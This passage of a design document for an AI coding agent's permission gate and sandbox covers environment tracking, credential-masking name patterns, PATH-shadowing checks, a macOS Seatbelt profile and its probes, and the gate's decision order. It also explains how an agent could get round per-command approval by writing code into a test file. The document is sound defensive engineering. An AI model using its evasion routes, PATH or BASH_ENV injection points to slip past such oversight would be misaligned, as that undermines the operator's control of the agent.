Bounded in the shell, because the byte count is what a `$(…)` in a value can make unbounded: at most
`ENV_PAIRS` (64) names and `ENV_BYTES` (4 KiB), and a single value over `ENV_VALUE` (1 KiB) is skipped
rather than counted. The daemon applies the same three bounds and **skips** what does not fit - `cargo
test` on this box sets a 2 KiB `LD_LIBRARY_PATH`, and a report *refused* for that one name would take
the session's whole environment, `PATH` included, with it. A skipped name is not held, which is the
same answer as one nobody set. What the daemon refuses whole is a trailer it cannot believe: a pair
that is not `NAME=value`, a name that is not an identifier, a value that is not one plain word. Cost,
measured: 384 us/call against 24 us for the bare trailer and 276 us for one `$( )` fork.

Lifetime: one report replaces the last one's shell-sourced entries (what the shell says is the whole
environment it holds, so an `unset` needs no rule of its own); the harness's pairs **win over the
report for the same name**, because they are what the next `bash` call really gets; a dead shell's
entries go with it, a restart re-seeds from the same pairs, and a migrated session carries no
environment at all. A confined or remote shell reports on its own side, so the values are the
boundary's or the far box's.

### 4j.4 What the card shows, and what it refuses to show

The resolver returns a note per substitution, and those notes are what the card and the audit row
carry:

```text
`$p` is `/home/dead/Projects/letibot` - from the environment this session's shell reported
`$CARGO_TARGET_DIR` is `/w/target` - from the pairs every command of this session is spawned with
`$GITHUB_TOKEN` is `ghp_…4c` - from the environment this session's shell reported, and it looks
  like a credential, so it is not written into this reading
```

The masking rule is a name match, not a guess at entropy: a name containing
`KEY`/`TOKEN`/`SECRET`/`PASSWORD`/`PASSWD`/`CREDENTIAL`/`PRIVATE`/`ACCESS_KEY`, or a value matching a
well-known prefix (`ghp_`, `sk-`, `AKIA`, `-----BEGIN`), is a credential; masked is the first four and
last two characters, or `…` alone for a value too short to hide anything in. `AUTH` is deliberately not
one of those words: it catches `SSH_AUTH_SOCK`, whose value is a path, so a word chosen to protect a
credential would have masked the one variable this feature is most useful for.

A credential is also not spliced into the reading. Every other value is written back into the command
text (`parameters::resolve`); a credential is left unresolved and the command stays as unread as it
was, because of where the spliced text goes: `shape_of` renders the post-substitution stages into the
approval key stored on every row and matched forever after, `Baseline.command.source` is kept, and the
oracle is shown the reading. A value in any of those is a value in the store, which is the disclosure
§3 forbids - so the fail-closed direction is also the only one that does not launder a secret into a
key.

### 4j.5 D15: which file a bare stage will run

A stage whose program is `cargo` runs whatever the current `PATH` finds, so a shape or a grant named
`cargo` is a claim about a file nobody named. D15 answers it by **naming the file**.

When: a stage runs under a `PATH` that is not the one the shell is pinned to, read from the parse in
source order - either a literal assignment in this command (`export PATH=…:$PATH` after the resolver
has written the session's `$PATH` out is a literal from that stage's byte offset on), or the session's
own `PATH` when a shell reported one that differs. A stage under the **pinned** `PATH` is not touched
at all: a grant for `cargo` is a grant about the `cargo` this box runs, and renaming it would re-key
every shape the corpus has already approved.

How: the gate resolves that name along the resolved `PATH` - each directory in order, the first
`dir/name` that is a regular file with an execute bit, which is the shell's rule - through
`Surroundings::programs`. Answered host-side, not by `command -v` in the trailer: the trailer runs
*after* a line and the names in the next line are not known when it runs, and asking the shell at
adjudication time would be a pty write and read per stage on the hot path against a shell that may be
dead, mid-command or on another machine. So `Surroundings::programs` states what the gate can honestly
see: `Host` for a session whose commands run in this daemon's own view, `None` otherwise.

Three outcomes, and the third is the safety property:

1. the file differs from the one the pinned `PATH` finds: the stage's program **becomes that file**, so
   the shape, `grant_program` and the card all name it (`/tmp/x/cargo build`), and a grant given for
   `cargo` cannot cover it, because `Grant::covers` compares the program string the reading produced.
   The intent table still reads the bare name, which is the rule a grant for `rm` covering `/bin/rm`
   depends on.
2. the file is the same: nothing changes, no churn in shapes, no re-asking.
3. the file cannot be established: **the `PATH` is not resolved at all**, exactly as before, and the
   card says which name it could not place. That is what makes *"nothing that was readable became
   unread"* true by construction - and only for a `PATH` the session supplied, which is the one case
   this feature created. A `PATH` the command's own text fixed (`export PATH=/w/bin; cat $PATH`) keeps
   the bare name it always had, because refusing there would make a *working* command unread.
   `parameters::Fixed::path` says which of the two it is.

What this does not do: it does not make the shell stateful. Adding the tracked environment to
`standing_env` after each call would make `export PATH=/tmp/x:$PATH` in one call pick the binary for
the next, `LD_PRELOAD` a name carried into every later command, and the operator asked once for the
first and never for the rest; that needs its own decision and a deny-list of names that change what a
program does without appearing in any text. And it does not read an environment off disk - no
`~/.bashrc`, no `environ` of a dying process, no store column: observed means the shell said so.

## 4k. The Mac's boundary: Seatbelt

macOS has no namespaces, no cgroups and no `unshare`. What it has is **Seatbelt**: `sandbox-exec -f
<profile>`, a mandatory-access policy the kernel evaluates on every file, mach, network and process
operation the process and everything it execs performs. Deprecated, present, and what Chrome ships to
three hundred million people. `crates/tools/src/exec/seatbelt.rs`; `confine::probe` answers with a
namespace boundary on Linux and a policy boundary here, and both are the same contract: a `ViewSpec`
in, a measured `Boundary` out.

The view decides what is inside - the project read-write at its own path, the system roots read-only,
the toolchain read-only out of the *operator's* home (`.cargo`, `.rustup`, `.local/bin`, the mise
trees, `Projects/llama.cpp`, `models`, `.gitconfig`, because the session's home is fresh and holds no
toolchain), `$HOME` and `/tmp` the session's own directories, egress a decision. `confine::pieces_of`
renders it as a bubblewrap argv; `seatbelt::render_profile` renders the same view as SBPL text.
Neither reads the other, and a field added to the view breaks both or neither.

```
(deny default)
(allow process*) (allow sysctl-read) (allow signal (target self))
(allow mach-lookup (global-name "com.apple.system.logger") …)   ; six, measured
(allow file-read* (literal "/") (subpath "/usr") …)             ; system + toolchain + view
(allow file-write* (subpath <checkout>) (subpath <session home>) …)
(deny network*)                                                  ; or (allow network*)
(deny file-read* file-write* (subpath "~/.ssh") …)              ; AFTER every allow, on purpose
```

Three details in that text are measurements rather than taste:

- **`(literal "/")` is load-bearing.** A profile that allows `file-read*` on `/usr` and the rest but
  not on `/` itself makes every process abort with `SIGABRT` before `main`: something in libsystem
  reads the root directory at start-up and the sandbox's check-in dies of the refusal.
- **The deny block is emitted last**, because SBPL is last-match-wins. That is the one place this
  weaker mechanism is *stricter* than the mount namespace: a grant of the whole home directory widens
  the view, and on Linux a bind mount cannot exclude a path inside itself - here the deny rule still
  wins, so a widened view still cannot read `~/.ssh`, the keychains, the shell profiles or letibot's
  own store. The probe measures exactly that.
- **`(subpath "<TMPDIR>/xcrun_db")`** is the only thing in the per-user temp directory the profile
  reaches. `git`, `make` and `/usr/bin/python3` are `xcrun` shims that `dlopen` a cache into
  `confstr(_CS_DARWIN_USER_TEMP_DIR)`, which is *not* `TMPDIR` and so cannot be redirected into the
  session's own directory; without those two lines every one of them prints `xcrun: error: couldn't
  create cache file`.

`MACH_SERVICES` is a six-name list rather than a filter: a program wanting a service not on it fails
naming it, and the fix is one line. `Seatbelt::probe` runs one shell script **inside the profile** and
reads `probe <name> <outcome>` lines back - the same rule `Bwrap::probe` follows, guard the fact and
not the proxy:

| subject | must be | the refusal if not |
|---|---|---|
| the canary, inside a writable part of the view | unreadable | the deny list does not win -> **nothing runs** |
| a write to a path outside the checkout | `EPERM` | a write outside succeeded -> nothing runs |
| a write inside the checkout | succeeds | the boundary forbids the session's own work -> nothing runs |
| `sh -c true` | runs | fork/exec failed inside -> nothing runs |
| a nested `sh -c` reading the canary | unreadable | a child strips the boundary -> nothing runs |
| `kill -0 <this process's pid>`, from inside | `EPERM` | a signal reaches out - recorded as `Absent`, not refused |
| a connect to `127.0.0.1:1` and to `192.0.2.1:80` | `EPERM` when egress is denied | an egress decision that did not take -> nothing runs |

Nothing is sent anywhere: the loopback subject is a port nothing listens on, the external one is
TEST-NET-1 (RFC 5737, reserved for documentation and routed nowhere), and `nc -z` closes as soon as
the answer arrives.

The property table (`confine::Prop`) is how a mechanism without namespaces describes itself. Three
properties are required; the fourth is reported as `ABSENT - this OS cannot give it` and printed in
full rather than omitted:

| property | measured | how it differs from Linux |
|---|---|---|
| `file-view` | **held** - the canary is unreadable over a writable home, a write outside fails, a write inside succeeds | **denied, not absent**: `open` answers `EPERM` where a mount namespace makes the file not-there, and `absence_notes` is written for each, since a note that only knew `ENOENT` would say nothing |
| `process-isolation` | **held** - `kill -0` on a process outside is `EPERM`, `ps` is refused, and a child *inside* is still killable so job control works | no PID namespace |
| `nested` | **held** - a child `sh -c` inherits the profile and is denied the same path | the policy is applied at `exec` and inherited, so there is nothing to `unshare` out of |
| `process-absence` | **ABSENT** - macOS has no PID namespace | a process outside is unreachable, not invisible; a lookup by pid still finds it, and `/proc` does not exist |

Two seals, one `NOT APPLICABLE on this platform`: `no-new-privs` has no macOS counterpart, and what
macOS gives instead is that the kernel applies the policy at `exec`, so a setuid program inside
inherits it. No cgroup either: the lifetime half is `exec::scope::ProcessGroups`, which reaps by
process group and says in its own docs that a group can be left with `setsid` and that a group id is a
reused pid.

That counts as measured for §6, for the half the ruling is about: the consequence being guarded
against is what a program the agent wrote can **read** and **send**, because those outlive the
session. What macOS does not give is process absence, and a command that signals the daemon is a
denial of service on this box rather than a disclosure of the operator's data - so it is printed as
`ABSENT` on the boundary's own description rather than hidden.

What it costs: one profile of 87 lines, 11 rules, 61 path filters, at **+5.1 ms per exec** (100 x
`/usr/bin/true` goes 0.128 s -> 0.641 s), fixed per exec and not growing with what the command does.
The other cost is stated in the module: the toolchain is read-only, so a build that needs a new
dependency cannot fetch it into the registry from inside the boundary and fails saying so.

`HostBackend::confined` / `confined_granting` ask `confine::probe`, so on macOS a `coder` or `runner`
session gets the policy boundary and `backend_confined` is true - which is what makes `allow-all`
available on a Mac at all (`Prereq::Confinement`). Sessions that already run unconfined (`leticode`)
are untouched. Every widening re-probes through the same dispatch (`with_session_tmp`,
`grant_into_view_impl`), so what is described is what runs. `bash`, background jobs and the persistent
shell all go through `Confinement::wrap`, which for this mechanism is `sandbox-exec -f <profile>
/bin/sh -c 'export HOME=… TMPDIR=…; exec "$@"'` - the shim exists because a profile cannot set an
environment variable and `wrap` returns an argv: `HOME` must be the session's own directory, `TMPDIR`
the session's own, and `CARGO_HOME`/`RUSTUP_HOME` the operator's read-only toolchain.

If `sandbox-exec` is missing or the probe refuses, the daemon **seats an unconfined whole-host session,
says so on the session's log as `boundary_absent`, and prints the refusal's own words**. On Linux the
same failure is still a refusal, because `bwrap` and a delegated cgroup are things a host can be given.
Two things are deliberately left: the profile is written per probe and never removed
(`$TMPDIR/letibot-seatbelt-<pid>/profile-<n>.sb`, outside every checkout on purpose, since a policy the
command can edit is not a policy), and `sandbox-exec` is deprecated - the day it goes, `probe` refuses
by name and every session falls back to the `boundary_absent` sentence.

## 4l. The order the gate decides in

`AdjudicatedGate::admit`, in order. Each arm is a rule, not an implementation detail:

0. **The breaker**, before anything else asks anything: three consecutive refusals in one task
   direction and the loop stops - `Escalate { to: human }`, `NotRun`, no adjudicator consulted.
1. **Layer A's own refusals.** `BaselineVerdict::NotRun` first (an action nobody could read is not one
   anybody can decide about), refused as `Unavailable` by `boundary:normaliser` - except at a point
   that admits everything, where an unreadable command goes on and the row says it ran unread. Then
   `Tier::Blocked`, refused as `deny_and_tell` by `boundary:flow`.
2. **The never-write list** (§3), `boundary:host`. The oracle is still asked and its answer recorded:
   an oracle that would admit a call touching the operator's ssh material is a calibration fact,
   invisible unless this path records a verdict.
3. **The `permission` config**, evaluated before the point: `deny` refuses, `allow` admits, `ask` falls
   through. A `bash` command is tested segment by segment, and a compound the splitter cannot read is
   asked, never allowed.
4. **The measured boundary** (§6): at `writes-allowed`, a command that crosses nothing is admitted with
   no card, by `gate:boundary`.
5. **The point.** `Mode::admits_unasked` governs `Tier::MayApprove` and nothing else, so this arm
   cannot widen what a point may not. Exec is excepted unless the mode follows it.
6. **A standing answer**: an approved shape (the parse with its literals holed, so two greps are one
   approval and `sed -n` is not `sed -i`) by `gate:shape`, then a session grant by
   `gate:session-grant`. Both skip when the call runs project code on a host with no boundary (R98).
7. **Nobody to ask.** A plugin layer's look is adjudicated and may not put up a card, so it stops here
   as `NotRun` with the sentence saying so.
8. **The decision.** At a point whose decider is a model, the model's admit *is* the decision, still
   bounded by the always-ask list, the earned scope and `Blocked`. Otherwise the adjudicator is asked.
   A selected option this request did not offer is refused as `NotRun` - it must not open the gate -
   and `Unavailable`/`Timeout`/`Cancelled` route to `OnTimeout`, which `request_for` always sets to
   `Deny`.

Every settled arm records a row and tells the model, and a denial carries the adjudicator's basis
unless the answer was a bare `Deny`, in which case the model is told the reasoning stayed in the audit
row. A refusal the model cannot understand is a refusal it will retry.

### What a card offers

The ladder is computed once, in `AdjudicatedGate::request_from`, from the facts the recording site
reads, so the list and what an answer does cannot drift. `Offer` says what may be offered and why
something is missing.

| rung | id | offered when |
|---|---|---|
| this one | `allow_once` | always |
| this class, for the session | `allow_session` | `Offer::session`: a grant taken now could cover a later call, which `Grant::covers` decides - it refuses an unresolved action before it looks at coverage, so a session grant over an unreadable command would cover nothing |
| always | `allow_always` | `derived_pattern` found a rule that would match: not for a heredoc, and not for a command with a segment that sets state for a later one |
| no | `deny` | always |
| no, and tell it why | `deny_and_tell` | always |

A point whose grants are `Once` gets the session rung anyway, because an explicit answer is the
operator overriding the point's default. On a host with no boundary a call that runs project code
offers neither standing rung, and the note says why (R98). Three other ladders are the same shape with
their own nouns: `view_grant_options` (read it, read and write it, no - read-only first, where Enter
lands), `memory_grant_options` (this once, up to this for the session, no) and `always_ask_options`
(allow this one, deny, deny and tell) - which has no standing rung at all, because an always-ask can be
admitted by a human this turn but never turned into a grant.

## 5. Open

Layers 2 and 3 and their seam are built: `crates/code/src/shell.rs`, `crates/tools/src/intent.rs`,
`crates/tools/src/authorise.rs`, and the gate. The four tiers, the always-ask list, the flow rule and
the earned scope are all code. What building them settled: the classifier sees `ModelBrief`, which has
no field holding the command as written; `NEVER_WRITE` survives, demoted to a first precheck that no
longer decides anything interesting; a hard list of destructive commands is deleted, and three
mechanisms keep a classifier from shrinking `ALWAYS_ASK` - the tier mints no `Adjudicable`, the gate
refuses to record a class grant for one, and the prompt does not offer a standing-grant option.

The audit row is not `(action, decision)`: it is the normalised action, the trail, the verdict and the
override, as separate values. The disagreements are the training signal and the agreements are the
denominator, since a corpus of only overrides is a biased sample. `AdjudicatedGate.log` holds the rows
**in memory** - the durable journal belongs to `letibot-sessionlog` and wiring it there is not done,
which is the one open item whose cost grows while it waits, because every day without the table is a
day of decisions that cannot be recovered. The row also has no wall-clock timestamp
(`letibot-transcript` does not stamp items), no record of which model build answered, and no
after-the-fact outcome.

What layer 1 must guarantee for layer 2 to mean anything: a resolved parse is not a resolved meaning.
A grammar reads text; a shell resolves a bare command name through aliases, functions and `PATH`, none
of which are in the text. So `intent::ShellTrust` defaults to `Unknown`, under which a **bare** name is
unresolved and the command is `not_run`; an absolute path is not shadowable and is unaffected. The gap
is small because `exec/host.rs` already spawns `/bin/sh -c`: non-interactive and non-login, so no rc
file is read, and `/bin/sh` is `dash` here, which reads `$ENV` only when interactive. Two requirements
remain before `Surroundings::with_pinned_shell` can honestly be called: `env_clear()` before the
explicit `env` pairs, so `PATH` is pinned rather than inherited; and unset `BASH_ENV`, `ENV`,
`SHELLOPTS`, `BASHOPTS`, because `BASH_ENV` **is** sourced by bash for non-interactive shells, so a
distribution where `/bin/sh` is bash has a real injection point this box does not. Stated as a
requirement rather than assumed, because a requirement crosses a merge where an assumption does not.

Still open: **how a denial is presented without becoming a nag** (§4b requires every denial to surface;
`DenialNotice` carries `BreakerState` so a head can collapse repeats, and nothing does yet); **where
the transcript edge is enforced** (`shell::Stage::stdout_surfaces` is the structural half, and
`Baseline::of_paths` covers the path-shaped tools by *reproducing* the rule rather than by sharing an
edge - two implementations of one invariant is how invariants stop agreeing); **the durable corpus**;
and **the model itself**, which is not built here - the seam takes an `AuthorisationOracle`, the fake
is `ScriptedOracle`, and what a real one needs is written into that trait: a `ModelBrief` and never a
string, a `budget()` it is abandoned for overrunning, and a `scope()` earned by measurement rather
than granted by assumption.

## 6. D16 and R98 - the boundary decides, and where there is none the test *is* the program

Both rulings are the operator's, and everything above still describes the machinery: what changed is
**how often it is reached**. A package session on a remote host at `writes-allowed` asked over a
hundred times across one brief, and a session on the operator's own box was no better.

> *"the thing is - agent can write any code in the test file and then do the test. the only real
> defense is cgroups and namespaces. the rest is theater."*

A per-command ruling inside a confinement that letibot has **measured** protects nothing a freshly
written test could not do instead - and that test is a `write`, which `writes-allowed` already admits.
The card was not buying a decision; it was buying a keystroke.

### What is admitted, and by what test

At `writes-allowed`, an `Access::Exec` call is admitted with **no card** when all four hold
(`adjudicate::admits_inside_the_boundary`, the arm labelled D16):

1. **The backend's confinement is measured and holds** - `Boundary::encloses`: every required namespace
   entered, **both seals `Held`** rather than merely not-open, and the boundary's egress the empty
   network namespace. The seal clause is stricter than `Boundary::complete` on purpose, and the reaper
   arrives with the process host or not at all.
2. **The call needs no egress.** No `network` intent, and the boundary denies egress anyway - both,
   because either alone leaves a door. `curl`, `cargo fetch`, `git push` and `npm install` all still
   ask. (`cargo fetch` did not carry a `network` intent until this slice: the table in `intent.rs`
   named `install`/`publish`/`add`/`update` and not `fetch`, so a gate asking *does this need the
   network?* answered no about the one command whose whole job it is.)
3. **No grant would have to widen the view.** Every region layer A placed is inside the session's own
   work: `Region::is_outside` is the tree's one answer to that question, reused rather than restated.
   `rm -rf target` is inside; `rm -rf ~/other`, `echo x > /etc/motd` and `rm -rf $X` are not, and still
   ask.
4. **Not an always-ask tier.** `Mode::admits_unasked` refuses `AlwaysAsk` at every point whatever the
   boundary, and `Blocked` is refused before the mode is read at all.

The row says why - `by: gate:boundary`, basis beginning *"admitted: inside the measured boundary
(D16)."* and naming the mechanism that measured it (`bubblewrap 0.11.1`) - and the operator is **also
told**, which the row alone could not do: the audit rows are read by `/gate` and by the corpus, and
neither scrolls while the work happens. One transcript line per admission - `HubAdmissions` collects it
from the gate and `Harness::flush_gate_admissions` writes it at the round boundary, after the round's
results and never between a call and its result.

What still asks: `curl`, `cargo fetch`, `npm install` and `ssh host` (egress, and the boundary would
deny it, so the card is where a wider view is decided); `git push` (the same, plus
`version_control_publish`); `gh …` (the credential tier); `sudo`, a delete outside the project and a
host never seen (the always-ask list, unchanged at every point); a command naming a path outside the
checkout (the region test); and **anything on an unconfined host**, where no boundary means the
per-command ruling is the only defence there is. The macOS host shell, an unconfined Linux host and a
probe that did not answer are all that last row: `AdjudicatedGate::with_boundary(None, refusal)` is the
whole of that state, and none of this fires.

`writes-allowed` only, which is the ruling's own sentence: `allow-all` already admits exec unasked by
its own definition, and `automode`/`automode-edits` still ask because at those points the question is
answered by a **model**, not a card - what D16 removes for the operator (an interruption) is something
those points do not have. Narrowing what an oracle is asked about would be a calibration change, and
the ruling did not make one.

Measured over every decision these boxes ever took (187,930 rows, 161,097 with a command, through
`corpus_replay::unasked`, so the instrument cannot go on answering after the gate has stopped): 270
cards were answered at `writes-allowed` and **80 of them (30%)** a measured boundary would have settled
with nobody asked - 69 of 251 on the mac, 11 of 18 on lab2x1.

### R98 (1) - where there is no boundary, the test file *is* the program

The same sentence read backwards. On a host with **no** measured boundary, a `bash` call whose stages
run a test runner, a build that executes project code, or a script in the checkout is **not settled by a
session grant, an approved shape or a `permission` rule**: it asks every time, and the card says why
(*"asks every time: it runs code the agent wrote (`cargo test`), and this host has no boundary - a grant
cannot stand in for the file that will exist by the next run"*).

**There is no setting for it, because it is not a preference.** The one fact the rule reads is the one
the session's open measured - `AdjudicatedGate::with_boundary(Some(boundary), _)` or `None` - and
`with_boundary(None, …)` is the whole of *no boundary*: the macOS host shell, an unconfined Linux
session and a probe that did not answer all arrive as that `None`. Nothing in the gate asks the kernel
which platform it is on, which is also what makes it provable on a Linux box: handing the gate `None`
IS the Mac's case. `a_host_with_no_measured_boundary_asks_with_nothing_switched_on` does that, and then
hands the same gate a measured boundary and shows the same command admitted by `gate:boundary` instead.

A `leticode.toml` that still carries the retired `[permissions] ask_unconfined_code` is refused by
name, the way every key this build does not know is: the key did nothing the boundary fact does not
already decide, so a file keeping it would be a file believing it still had a say.

What counts (`crates/tools/src/project_code.rs`): `cargo test|run|build|bench|check|clippy`
`|nextest|miri|doc-test` (a build script is project code and runs on `check` too), `pytest`, `py.test`,
`tox`, `nox` and `python -m pytest|unittest|tox|nose|nose2|doctest`, `go test`,
`npm`/`yarn`/`pnpm`/`bun` `test` and `run`, `make`/`gmake`/`just`/`task`, an interpreter handed a path
in the checkout, and any program that is itself a path (`./scripts/test.sh`). Wrappers - `sudo`, `env`,
`timeout` - are unwrapped first, because that is where a runner goes to hide. A system binary is not
project code (`/bin/sed` is `sed`); a toolchain under `~/.local/bin` (mise's shims) reads as one, which
is the narrow direction and is stated rather than found.

How it binds, at three places that must agree: the ladder offers no standing rung (`Offer`), the three
arms that honour a standing answer skip it (session grants, the shape cache, the `permission` config's
`allow`), and the two that would write one refuse. An answer naming a rung that was not offered is
refused by the gate's own option check, so an older head cannot push one through either. It does not
touch the tier, the boundary, or any command that is not this: `git status`, `cargo fmt`, `grep` and the
rest keep their ladders, their grants and their shape cache - which the tests pin in the same breath,
so a fix that narrowed every ladder would fail rather than pass quietly.

What the rule costs, measured on the same corpus before it was turned on (settles = rows a standing
answer decided; would ask = the subset at a point whose exec disposition is `Ask`):

| runner | mac: settles | mac: would ask | all hosts: settles | all hosts: would ask |
|---|---:|---:|---:|---:|
| `cargo test` | 378 | **24** | 2,960 | **575** |
| a program in the checkout (`./scripts/…`) | 137 | **137** | 176 | **176** |
| `cargo clippy` | 124 | 0 | 322 | 18 |
| `cargo build` | 115 | **4** | 485 | **98** |
| `go test` | 44 | 0 | 136 | 3 |
| `cargo check` | 20 | **3** | 475 | **74** |
| a script in the checkout (`bash scripts/…`) | 15 | **3** | 110 | **39** |
| `python3 -m pytest` | 1 | 0 | 1 | 0 |
| `cargo run` | 0 | 0 | 6 | 3 |
| **total** | **834** | **171** | **4,671** | **986** |

171 cards on the mac's record, 137 of them the session's own programs (`./scripts/…`, `target/debug/…`),
the case the ruling is about, and 24 `cargo test`. Most of the 834 stays free because it is at
`allow-all`, where nothing was asked anyway - and `allow-all` is not an exception to this rule, it is
outside it: the point admits exec by its own disposition, before any standing answer is consulted. So
a box already at `allow-all` did not get noisier; a box at `writes-allowed` gained 24 `cargo test`
cards on the mac's record. Half 2 is designed to take those away again - a Mac session inside a
measured seatbelt boundary is admitted by D16 (§4k) - and that has not been measured on a Mac yet.
